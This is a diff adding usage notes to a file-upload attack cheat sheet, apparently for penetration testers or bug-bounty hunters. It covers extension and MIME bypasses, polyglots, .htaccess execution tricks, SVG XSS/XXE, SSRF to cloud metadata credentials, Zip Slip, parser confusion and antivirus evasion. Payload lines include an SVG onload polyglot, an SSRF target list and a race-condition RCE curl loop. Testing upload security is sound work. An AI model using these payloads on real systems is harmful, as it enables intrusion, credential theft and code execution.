@@ -5,6 +5,7 @@
 ---
 
 ## A. Extension bypass cheat sheet (guide §7)
+*What & when:* reach for this when the server blocks by **name** — a denylist you beat with a forgotten alias (`.phtml`, `.pht`), or a whitelist you beat with a parser-disagreement trick (`shell.php.jpg`). Match the language column to whatever the stack actually runs (httpx/Wappalyzer told you).
 
 **PHP execution extensions (denylist leaks):**
 ```
@@ -71,6 +72,7 @@ charset / boundary quirks
 ---
 
 ## C. Magic bytes & polyglots (guide §8)
+*What & when:* use these when the server **peeks at the bytes** to verify "it's really an image." Prepend a real signature so the sniffer is satisfied, while your code rides along in a spot the image format ignores. A polyglot is the finished product — one file that's honestly both an image and a script.
 
 **Magic byte prefixes (prepend before payload):**
 ```
@@ -116,6 +118,7 @@ printf 'GIF89a/*<svg onload=alert(document.domain)>*/' > poly.gif
 ---
 
 ## E. `.htaccess` / `web.config` to force execution (guide §10)
+*What & when:* the move when the allowlist only permits images and you can't smuggle an executable extension — instead **upload the server's own config file** to redefine what the allowed extension *means* ("run `.jpg` as PHP"). Try `.htaccess` (Apache), `web.config` (IIS), `.user.ini` (PHP-FPM), and the FPM `fix_pathinfo` path trick — whichever the stack allows.
 
 ```apache
 # .htaccess — make image extensions run as PHP in this dir:
@@ -147,6 +150,7 @@ Then upload `shell.jpg` containing PHP/ASP → request it → executes. (Try `.h
 ---
 
 ## F. SVG payloads (XSS + XXE) (guide §13/§14)
+*What & when:* SVG is an XML document that can carry script, so one uploaded `.svg` covers two impacts — **stored XSS** if it's served inline from the app origin, and **XXE** (file read / SSRF) if the server parses it. Pick the XSS block when you can reach the served file; pick the XXE/OOB block when an upload produces a preview/thumbnail (= the server parsed it).
 
 **SVG stored XSS (served inline from app origin):**
 ```xml
@@ -193,6 +197,7 @@ Upload evil.docx to a feature that parses/previews it.
 ---
 
 ## H. SSRF via "import from URL" (guide §15)
+*What & when:* the instant a feature says "fetch from a link," **the server** makes the request — so aim it at the cloud metadata address for temporary keys, or at internal-only services. Confirm blind cases with the OOB line first, then escalate to the metadata/creds targets. Often the fastest Critical on the whole upload surface.
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/        AWS creds
@@ -207,6 +212,7 @@ http://YOUR.oast.fun/ssrf                                                 confir
 ---
 
 ## I. Zip Slip & symlink archives (guide §17)
+*What & when:* for any "upload a .zip/.tar and we extract it" feature (themes, plugins, backup-restore). Zip Slip abuses the *entry names* to write outside the extraction folder (→ web-root shell); the symlink variant reads or overwrites host files. Note the `-h` warning in the tar comment — using it breaks the symlink attack.
 
 ```python
 # Zip Slip — make_zipslip.py (also in poc/): entry path traverses out on extraction
@@ -268,6 +274,7 @@ nuclei -u https://target -tags fileupload,imagemagick,exiftool,xxe
 ---
 
 ## N. Content-Type / MIME reference matrix (guide §6)
+*What & when:* your lookup table once you know which "type" the validator trusts. The category lists are declared-types to try; the "lie pairs" map a payload to an allowed type + executing name; the magic-byte cross-table makes libmagic agree by prepending the real signature. Classify the model (guide §6.1) first, then pull from the right block.
 
 > Set the **per-part** `Content-Type` to a type the allowlist permits (not the request CT — that's `multipart/form-data`).
 > First classify the validation model (guide §6.1); then pick from the right column. Sources: PortSwigger, PayloadsAllTheThings, HackTricks, IANA media-types.
@@ -326,6 +333,7 @@ class file (java)            CA FE BA BE
 ---
 
 ## O. Multipart / parser-confusion structural tricks (guide §6.4)
+*What & when:* the bypasses that beat a server which "properly" cross-checks magic+MIME+extension. They don't fool one inspector — they exploit the front-end validator and back-end framework **disagreeing** on how the multipart request is read (which part, which header, which filename wins). Send one at a time and watch which is accepted *and* lands an executable file.
 
 > When a single CT swap fails, exploit a **disagreement** between the front-end validator and the back-end framework about how the multipart part is read. (PortSwigger / HackTricks / real bug-bounty Multer & WAF-bypass write-ups.)
 
@@ -396,6 +404,7 @@ Content-Type: image/png
 ---
 
 ## P. Real-world critical upload attacks & CVEs (guide §16) — High/Critical, benign-marker only
+*What & when:* the payloads for when baseline showed the file is **processed** (resized, thumbnailed, "we generate a PDF", "convert your video"). Each is a valid file of an allowed type that detonates inside the parser — so they work even against allowlist + sandbox-CDN + re-encoding. Fingerprint the processor + version first, then fire only the matching CVE, benign target only.
 
 > These detonate inside the **processor** — a *valid file of an allowed type* is the payload, so they work even with allowlist + sandbox-CDN + re-encoding. Keep every command/target **benign** (OOB ping, /etc/hostname, your collaborator). Sources: ImageTragick, NVD, PortSwigger research, PayloadsAllTheThings, HackTricks.
 
@@ -470,7 +479,7 @@ for i in $(seq 1 400); do curl -s "$URL?c=echo RCE-POC-7f3a9" & done; wait
 ```
 ```
 □ Confirm AV exists first with EICAR; note WHERE it triggers (on save? on scan? async?).
-□ Prefer a minimal BENIGN proof shell (`<?=md5(31337);?>` → expect 4e8d...) — rarely matches AV signatures.
+□ Prefer a minimal BENIGN proof shell (`<?=md5(31337);?>` → expect 6f3249aa304055d63828af3bfab778f6) — rarely matches AV signatures.
 □ Multipart parser confusion (§O) + obfuscated shell often slips both WAF and AV.
 □ Or win the RACE (§R) before the scan completes.
 ```
